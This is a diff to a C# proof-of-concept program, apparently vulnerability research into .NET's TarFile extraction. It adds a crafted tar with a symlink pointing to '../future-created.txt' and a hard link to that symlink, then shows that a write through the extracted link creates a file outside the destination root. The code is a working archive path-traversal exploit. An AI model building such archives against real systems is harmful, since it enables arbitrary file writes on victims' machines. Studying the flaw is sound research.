@@ -86,6 +86,31 @@ class Program
         return tar;
     }
 
+
+    static string CreateDanglingWriteVariantTar(string root)
+    {
+        string tar = Path.Combine(root, "dangling-write.tar");
+        using FileStream fs = File.Create(tar);
+        using TarWriter writer = new TarWriter(fs, leaveOpen:false);
+
+        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "x/"));
+        writer.WriteEntry(new PaxTarEntry(TarEntryType.Directory, "x/y/"));
+
+        // At x/y/s, ../future-created.txt resolves to x/future-created.txt inside the extraction root.
+        // At rebased root-level escape-write, the same target resolves one level outside the root.
+        writer.WriteEntry(new PaxTarEntry(TarEntryType.SymbolicLink, "x/y/s")
+        {
+            LinkName = "../future-created.txt"
+        });
+
+        writer.WriteEntry(new PaxTarEntry(TarEntryType.HardLink, "escape-write")
+        {
+            LinkName = "x/y/s"
+        });
+
+        return tar;
+    }
+
     static void Main()
     {
         Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
@@ -183,6 +208,29 @@ class Program
                 "rebased deep symlink must access second researcher-controlled outside path");
 
             Console.WriteLine("TAR_HARDLINK_REBASE_GENERALITY=CONFIRMED");
+
+            string writeDest = Path.Combine(root, "write-dest");
+            Directory.CreateDirectory(writeDest);
+            string writeTar = CreateDanglingWriteVariantTar(root);
+            TarFile.ExtractToDirectory(writeTar, writeDest, overwriteFiles:true);
+
+            string writeEscape = Path.Combine(writeDest, "escape-write");
+            string outsideCreated = Path.Combine(root, "future-created.txt");
+
+            Require(new FileInfo(writeEscape).LinkTarget == "../future-created.txt",
+                "rebased write symlink must retain attacker-controlled relative target");
+            Require(!File.Exists(outsideCreated),
+                "outside target must not exist before the post-extraction write");
+
+            File.WriteAllText(writeEscape, "POST_EXTRACTION_OUTSIDE_WRITE_5ea2");
+
+            Require(File.Exists(outsideCreated),
+                "ordinary write through extracted path must create file outside destination root");
+            Require(File.ReadAllText(outsideCreated) == "POST_EXTRACTION_OUTSIDE_WRITE_5ea2",
+                "outside file must contain controlled write marker");
+
+            Console.WriteLine($"POST_EXTRACTION_WRITE_PATH={outsideCreated}");
+            Console.WriteLine("TAR_REBASED_SYMLINK_OUTSIDE_WRITE_PRIMITIVE=CONFIRMED");
         }
         finally
         {
